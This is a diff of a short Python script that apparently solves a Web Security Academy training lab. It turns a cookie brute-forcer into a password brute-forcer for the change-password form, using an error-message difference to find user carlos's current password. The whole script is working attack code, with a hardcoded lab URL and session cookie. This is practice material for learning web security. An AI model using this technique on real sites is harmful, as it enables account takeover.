@@ -34,12 +34,12 @@ custom_theme = Theme({
 })
 console= Console(theme=custom_theme)
 
-cookies_file= open('base64_new.txt', 'r')
-lines = cookies_file.readlines()
+password_file= open('passwords.txt', 'r')
+lines = password_file.readlines()
 
-URL = "https://0aba00cb0453d858878eb62b004400ed.web-security-academy.net/my-account"
+URL = "https://0ab100c103cc6200812220950093005a.web-security-academy.net/my-account/change-password"
 
-status = console.status(status="[bold green]cookie brute-forcing", spinner='circle')
+status = console.status(status="[bold green] password change brute-forcing", spinner='circle')
 
 status.start()
 usernames = []
@@ -47,15 +47,23 @@ usernames = []
 
 
 for line in lines:
-    cookies= {'stay-logged-in': line.strip()}
+    data= {'username' : 'carlos',
+              'current-password': line.strip(),
+              'new-password-1' : 'aaa',
+              'new-password-2': 'bbbcc'}
+    cookies={
+        'session': 'gENhz0dzbz9WFLIjWobQAGdrDoCcNDFV'
+    }
+   
 
-    response = requests.get(url=URL, cookies=cookies)
+    response = requests.post(url=URL, data=data, cookies=cookies)
     #print(response.text)
     #print(response.content)
-    if "Your username is: carlos" in response.text:
+    if "New passwords do not match" in response.text:
         status.stop()
-        console.print('revert this to get the password', style='warning')
+        console.print('password obtained', style='warning')
         console.print(line)
+        console.print('the new one is aaa')
         break
     
     
